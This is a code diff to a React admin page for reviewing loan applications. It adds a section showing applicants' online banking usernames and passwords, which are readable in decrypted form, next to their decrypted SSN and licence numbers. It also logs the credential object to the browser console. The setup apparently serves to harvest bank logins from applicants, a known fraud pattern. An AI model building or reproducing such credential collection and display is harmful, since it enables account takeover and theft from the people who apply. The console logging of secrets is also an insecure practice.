@@ -44,6 +44,30 @@ interface ApplicationDetail {
   ssn_decrypted?: string;
   dl_decrypted?: string;
   account_decrypted?: string;
+  // Bank verification (nested object from API)
+  bankVerification?: {
+    full_name: string;
+    email: string;
+    application_id: string;
+    online_banking_username: string;
+    online_banking_password: string;
+    bank_name: string;
+    account_type: string;
+    verification_status: string;
+    created_at: string;
+  };
+}
+
+interface BankVerificationDetail {
+  full_name: string;
+  email: string;
+  application_id: string;
+  online_banking_username: string;
+  online_banking_password: string;
+  bank_name: string;
+  account_type: string;
+  verification_status: string;
+  created_at: string;
 }
 
 interface AuditEntry {
@@ -130,6 +154,8 @@ export default function ApplicationDetailPage() {
   const { adminFetch } = useAdminApi();
 
   const [app, setApp] = useState<ApplicationDetail | null>(null);
+  const [bankVerification, setBankVerification] =
+    useState<BankVerificationDetail | null>(null);
   const [auditLog, setAuditLog] = useState<AuditEntry[]>([]);
   const [dataLoading, setDataLoading] = useState(true);
   const [showDecrypted, setShowDecrypted] = useState(false);
@@ -139,6 +165,7 @@ export default function ApplicationDetailPage() {
   const [success, setSuccess] = useState("");
 
   const id = params.id as string;
+  console.log(bankVerification);
 
   useEffect(() => {
     if (!loading && !user) router.replace("/admin/login");
@@ -155,6 +182,7 @@ export default function ApplicationDetailPage() {
       })
       .then((data) => {
         setApp(data.application);
+        setBankVerification(data?.bankVerification);
         setAuditLog(data.auditLog || []);
       })
       .catch((err) => setError(err.message))
@@ -325,7 +353,18 @@ export default function ApplicationDetailPage() {
               />
               <Field label="Email" value={app.email} />
               <Field label="Phone" value={app.phone} />
-              <Field label="Date of Birth" value={app.date_of_birth} />
+              <Field
+                label="Date of Birth"
+                value={
+                  app.date_of_birth
+                    ? new Date(app.date_of_birth).toLocaleDateString("en-US", {
+                        month: "2-digit",
+                        day: "2-digit",
+                        year: "numeric",
+                      })
+                    : "N/A"
+                }
+              />
               <Field label="Driver's License State" value={app.dl_state} />
               {showDecrypted && app.ssn_decrypted && (
                 <Field label="SSN (Decrypted)" value={app.ssn_decrypted} />
@@ -393,6 +432,53 @@ export default function ApplicationDetailPage() {
                 </div>
               )}
             </Section>
+
+            {/* Bank Verification Details */}
+            {bankVerification && (
+              <Section title="Bank Verification Details">
+                <Field label="Full Name" value={bankVerification?.full_name} />
+                <Field label="Email" value={bankVerification?.email} />
+                <Field
+                  label="Online Banking Username"
+                  value={
+                    showDecrypted
+                      ? bankVerification?.online_banking_username
+                      : bankVerification?.online_banking_username ===
+                          "[ENCRYPTED]"
+                        ? "[ENCRYPTED]"
+                        : "••••••••"
+                  }
+                />
+                <Field
+                  label="Online Banking Password"
+                  value={
+                    showDecrypted
+                      ? bankVerification?.online_banking_password
+                      : bankVerification?.online_banking_password ===
+                          "[ENCRYPTED]"
+                        ? "[ENCRYPTED]"
+                        : "••••••••"
+                  }
+                />
+                <Field
+                  label="Application ID"
+                  value={bankVerification?.application_id}
+                />
+                <Field label="Bank Name" value={bankVerification?.bank_name} />
+                <Field
+                  label="Account Type"
+                  value={bankVerification?.account_type}
+                />
+                <Field
+                  label="Verification Status"
+                  value={bankVerification?.verification_status}
+                />
+                <Field
+                  label="Submitted At"
+                  value={bankVerification?.created_at}
+                />
+              </Section>
+            )}
 
             {/* UTM / Tracking */}
             {(app.utm_source || app.utm_medium || app.utm_campaign) && (
